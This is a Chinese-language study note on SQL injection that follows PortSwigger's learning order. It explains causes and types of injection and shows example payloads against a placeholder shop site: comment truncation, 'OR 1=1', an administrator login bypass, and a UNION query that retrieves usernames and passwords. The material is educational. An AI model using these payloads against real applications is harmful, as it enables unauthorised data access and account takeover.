> 根据portswigger网站的推荐学习顺序，学习网络安全漏洞

![image-20220113221638178](https://raw.githubusercontent.com/lant34m/pic/main/image-20220113221638178.png)

![image-20220113221650975](https://raw.githubusercontent.com/lant34m/pic/main/image-20220113221650975.png)

![image-20220113221700751](https://raw.githubusercontent.com/lant34m/pic/main/img/image-20220113221700751.png)

![image-20220113221708824](https://raw.githubusercontent.com/lant34m/pic/main/image-20220113221708824.png)

# SQL 注入

> SQL injection is an old-but-gold vulnerability responsible for many high-profile data breaches. Although relatively simple to learn, it can potentially be used for some high-severity exploits. This makes it an ideal first topic for beginners, and essential knowledge even for more experienced users.
>
> SQL注入是一个老而弥坚的漏洞，对许多高知名度的数据泄露事件负有责任。虽然学习起来相对简单，但它有可能被用于一些高风险的漏洞。这使得它成为初学者理想的第一个主题，甚至对更有经验的用户来说也是必不可少的知识。

![image-20220114161003494](https://raw.githubusercontent.com/lant34m/pic/main/img/image-20220114161003494.png)

SQL注入漏洞允许攻击者干扰应用程序对其数据库的查询。它通常允许攻击者查看通常不能检索的数据，包括其他用户的数据或数据库相关信息。在许多情况下，攻击者可以修改或删除这些数据，导致网站应用程序内容或行为发生==持久性变化==。

在某些情况下，攻击者可以损害底层服务器或其它后端设施或进行拒绝服务攻击。

## 造成SQL注入漏洞的主要原因

前端的数据传入到后端处理时，没有做严格的判断，导致其传输的代码拼接到SQL语句中，被当做SQL语句的一部分执行。

## SQL注入的种类

- 数字型注入
- 字符型注入
- 搜索型注入
- xx型注入
- insert/update注入
- delete注入
- http header注入
- 盲注 base on boolean
- 盲注 base on time
- 宽字节注入

也可以分为

- 修改一个SQL查询返回额外的结果
- 改变SQL查询语句干扰网站应用程序逻辑
- UNION拼接检索不同数据库信息
- 提取罐与数据库的版本和结构的信息
- 盲注，即查询的结果不应在网站返回的响应中

## 详解

### 修改一个SQL查询返回额外的结果

有一个购物网站以不同的种类展示商品，当用户点击商品时，浏览器的URL是

```
https://insecure-website.com/products?category=Gifts
```

这个会调用后端一个SQL语句从数据库中查询信息。

```sql
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
```

这个SQL语句会向数据库中products表请求所有类别是Gifts类别和released列值为1的所有商品信息。

如果网站没有任何针对SQL注入攻击的防御措施，可以构建一个如下语句

```
https://insecure-website.com/products?category=Gifts'--
```

当前端传回至后端执行SQL语句时，

```sql
SELECT * FROM products WHERE category = 'Gifts'--' AND released = 1
```

--在数据库中被用于注释后面所有内容，这有效的删除了后端构造SQL语句的其余部分，所以可以将released列的限制去除。

```
https://insecure-website.com/products?category=Gifts'+OR+1=1--
```

上面的URL被传入后端的SQL语句是

```sql
SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1
```

### 改变SQL查询语句干扰网站应用程序逻辑

用户登录界面时，用户通过用户名和密码登陆。以下是可能的SQL语句

```sql
SELECT * FROM users WHERE username = 'wiener' AND password = 'bluecheese'
```

在已知用户名的情况下，可以通过注释将密码查询注释掉。即

```sql
SELECT * FROM users WHERE username = 'administrator'--' AND password = ''
```

该行为可直接作为管理员用户登陆。

### ==UNION拼接检索不同数据库信息==

在网站应用程序返回SQL语句结果时，可以利用SQL注入从数据库中获取其他信息。

使用UNION联合查询执行额外的SELECT语句

```sql
SELECT name, description FROM products WHERE category = 'Gifts'
```

执行UNION语句

```sql
SELECT name, description FROM products WHERE category = 'Gifts' UNION SELECT username, password FROM users--'
```

查询到了user表中的username和password

#### 要求

- 每个查询必须返回相同数量的列
- 每列中的数据类型必须在各个查询之间兼容

通常需要在构造语句前了解

- 原始查询返回了多少列
- 原始查询的哪些列可以保存注入查询的结果

